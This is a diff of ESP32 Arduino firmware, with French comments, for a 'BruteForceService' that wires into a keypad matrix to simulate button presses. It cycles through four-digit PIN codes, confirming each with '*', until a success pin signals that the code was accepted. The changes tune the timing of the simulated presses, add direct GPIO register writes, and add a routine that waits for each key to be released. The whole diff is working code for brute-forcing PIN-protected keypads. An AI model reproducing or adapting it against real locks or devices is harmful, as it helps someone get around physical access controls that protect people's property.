@@ -3,16 +3,22 @@
 
 BruteForceService::BruteForceService() {}
 
+void IRAM_ATTR riseLine0(){GPIO.out_w1ts = ((uint32_t)1 << LIN0); }
+void IRAM_ATTR lowLine0(){GPIO.out_w1tc = ((uint32_t)1 << LIN0);}
+void IRAM_ATTR riseLine1(){GPIO.out_w1ts = ((uint32_t)1 << LIN1); }
+void IRAM_ATTR lowLine1(){GPIO.out_w1tc = ((uint32_t)1 << LIN1);}
+
 void BruteForceService::startBruteForce() {
     Serial.println("start bruteforce");
     long timeStart = millis();
     setupPinForBruteforce();
 
-    int i = 1000;
+
+    int i = 2999;
     while (!digitalRead(SUCCESS_PIN) && i < 10000) {
-      if (i % 1000 == 0){
+      if (i % 100 == 0){
         Serial.println(i);
-      }
+      } 
         send4DigitCode(i);
         sendTouch(10); //send * to validate password
         i++;
@@ -27,14 +33,13 @@ void BruteForceService::startBruteForce() {
 }
 
 void BruteForceService::setupPinForNeutralAction() {
-    pinMode(LIN0, INPUT);
-    pinMode(LIN1, INPUT);
-    pinMode(LIN2, INPUT);
-    pinMode(LIN3, INPUT);
+    pinMode(LIN0, INPUT_PULLUP);
+    pinMode(LIN1, INPUT_PULLUP);
+    pinMode(LIN2, INPUT_PULLUP);
+    pinMode(LIN3, INPUT_PULLUP);
     pinMode(COL0, INPUT_PULLUP);
     pinMode(COL1, INPUT_PULLUP);
     pinMode(COL2, INPUT_PULLUP);
-    pinMode(COL3, INPUT_PULLUP);
 }
 
 void BruteForceService::setupPinForBruteforce() {
@@ -45,7 +50,6 @@ void BruteForceService::setupPinForBruteforce() {
     pinMode(COL0, INPUT_PULLUP);
     pinMode(COL1, INPUT_PULLUP);
     pinMode(COL2, INPUT_PULLUP);
-    pinMode(COL3, INPUT_PULLUP);
 
     pinMode(LIN0, OUTPUT);
     pinMode(LIN1, OUTPUT);
@@ -66,17 +70,31 @@ void BruteForceService::send4DigitCode(int code) {
     int digit = code % 10;
     sendTouch(digit);
 }
-
+//
 //void BruteForceService::simulateButtonPress(int col,int line){
-// version easy mais moins efficace
-//  while (digitalRead(col)) {}
-//  digitalWrite(line,LOW);
-//  while (!digitalRead(col)) {}
-//  digitalWrite(line,HIGH);
+//
+//  //le principe est de copier l'état de la colonne contenant la touche voulue sur la ligne de la touche.
+//  //tant que la colonne de la touche est à l'état haut, on attends
+//  while (digitalRead(col) == HIGH){}
+//  
+//  //dès qu'elle passe à l'état bas, on fait passer la ligne de la touche à l'état bas
+//  digitalWrite(line, LOW);
+//  
+//  //tant que la colonne est toujours à l'état bas, on attends
+// while (digitalRead(col) == LOW){}
+//  
+//  
+//  //dès qu'elle repasse à l'état haut, on repasse la ligne à l'état haut
+//  
+//  digitalWrite(line, HIGH);
+//
+// 
 //}
 
+
 void BruteForceService::simulateButtonPress(int col,int line){
-  //le principe est de copier l'état de la colonne contenant la touche 0 sur la ligne de la touche 0.
+
+  //le principe est de copier l'état de la colonne contenant la touche voulue sur la ligne de la touche.
   //tant que la colonne de la touche est à l'état haut, on attends
   while (GPIO.in>>col & 0x1){}
   
@@ -86,14 +104,26 @@ void BruteForceService::simulateButtonPress(int col,int line){
   //tant que la colonne est toujours à l'état bas, on attends
   while(!(GPIO.in>>col & 0x1)){}
   
+  
   //dès qu'elle repasse à l'état haut, on repasse la ligne à l'état haut
   GPIO.out_w1ts = ((uint32_t)1 << line);
+ 
 }
 
+void releaseFinger(){
+   while (GPIO.in>>COL0 & 0x1){}
+     while(!(GPIO.in>>COL0 & 0x1)){}
+     
+   while (GPIO.in>>COL1 & 0x1){}
+     while(!(GPIO.in>>COL1 & 0x1)){}
+     
+   while (GPIO.in>>COL2 & 0x1){}
+     while(!(GPIO.in>>COL2 & 0x1)){}
+}
 void BruteForceService::sendTouch(byte touch) {
-//    setupPinForBruteforce();
-//Serial.println("sending : ");
-//Serial.println(touch);
+    setupPinForBruteforce();
+    //Serial.print("simulate ");
+    //Serial.println(touch);
     switch (touch) {
         //press button 0
         case 0: //button 0 col1 lin1
@@ -133,7 +163,5 @@ void BruteForceService::sendTouch(byte touch) {
             simulateButtonPress(COL2,LIN3);
             break;
     }
-    
-//    setupPinForNeutralAction();
- delayMicroseconds(50); 
+    releaseFinger();
 }
